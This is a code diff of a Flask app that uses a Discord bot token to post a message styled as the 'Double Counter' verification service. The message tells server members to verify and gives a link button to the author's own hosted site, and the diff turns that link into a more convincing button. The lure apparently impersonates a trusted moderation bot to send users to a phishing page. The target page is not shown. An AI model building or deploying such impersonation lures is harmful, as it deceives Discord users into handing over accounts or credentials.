@@ -382,28 +382,40 @@ def send_embed():
         return "BOT_TOKEN not set", 400
 
     base_url = os.getenv('RENDER_URL', 'https://your-render-url.onrender.com')
+    
+    # Embed
     embed = {
         "title": "**Double Counter**",
-        "description": "**APP.**",
+        "description": "**APP.**\n\nVerify to access this server\nThis server uses **Double Counter** to block alt accounts and VPNs.\n\n**Server:** Serwer użytkownika imharm",
         "color": 0x5865F2,
-        "fields": [
-            {
-                "name": "Verify to access this server",
-                "value": f"This server uses **Double Counter** to block alt accounts and VPNs.\n\n**Server:** Serwer użytkownika imharm\n\n**[Click here to verify]({base_url}/?server=Serwer%20u%C5%BCytkownika%20imharm)**",
-                "inline": False
-            }
-        ],
         "footer": {"text": "Double Counter · Trust & Safety"},
         "timestamp": datetime.datetime.now().isoformat()
+    }
+
+    # Button
+    payload = {
+        "embeds": [embed],
+        "components": [{
+            "type": 1,  # Action Row
+            "components": [{
+                "type": 2,  # Button
+                "style": 5,  # Link button
+                "label": "Click here to verify",
+                "url": f"{base_url}/?server=Serwer%20u%C5%BCytkownika%20imharm"
+            }]
+        }]
     }
 
     response = requests.post(
         f"https://discord.com/api/v10/channels/{VERIFY_CHANNEL_ID}/messages",
         headers={"Authorization": f"Bot {BOT_TOKEN}", "Content-Type": "application/json"},
-        json={"embeds": [embed]}
+        json=payload
     )
 
-    return f"✅ Embed sent!" if response.status_code == 200 else f"❌ Error: {response.text}"
+    if response.status_code == 200:
+        return "✅ Embed with button sent!", 200
+    else:
+        return f"❌ Error: {response.text}", 400
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
